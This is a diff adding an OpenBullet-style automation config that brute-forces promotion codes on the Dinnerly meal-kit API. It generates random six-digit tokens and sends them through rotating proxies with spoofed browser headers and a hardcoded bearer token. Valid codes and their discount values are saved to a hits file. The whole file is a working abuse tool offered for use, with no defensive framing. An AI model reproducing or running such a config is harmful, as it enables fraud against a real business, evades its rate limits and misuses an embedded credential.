@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Dinnerly",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-26T18:32:51.1727+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "simple",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": true,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?d?d?d?d?d?d" -> VAR "token" 
+
+REQUEST GET "https://api.dinnerly.com/promotions/<token>?brand=dn&country=us&product_type=web" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJtcyIsImNvdW50cnkiOiJ1cyIsImJyYW5kIjoiZG4iLCJ0cyI6MTYxNDM1NDE5NiwicmFuZG9tX2lkIjoiNzgxOTkyIn0.QOcaoUjM544rkGmlPeFE83OQcLOiemSEHO2_N4ZVEkM" 
+  HEADER "origin: https://dinnerly.com" 
+  HEADER "referer: https://dinnerly.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "current_discount" 
+  KEYCHAIN Failure OR 
+    KEY "promotion not found" 
+    KEY "valid\":false" 
+
+PARSE "<SOURCE>" JSON "value" CreateEmpty=FALSE -> CAP "Value" 
+
+PARSE "<SOURCE>" JSON "current_discount" CreateEmpty=FALSE -> CAP "First Order Discount" 
+
+PARSE "<SOURCE>" JSON "remaining_discount" CreateEmpty=FALSE -> CAP "Remaining Discount" 
+
+PARSE "<SOURCE>" JSON "valid" CreateEmpty=FALSE -> CAP "Valid" 
+
+PARSE "<SOURCE>" JSON "code" CreateEmpty=FALSE -> CAP "Code" 
+
+UTILITY File "Hits\\Dinnerly\\Discounts.txt" AppendLines "Value = <Value> | First Order Discount = <First Order Discount> | Remaining Discount = <Remaining Discount> | Valid = <Valid> | Code = <Code>" -> VAR "Capture" 
+
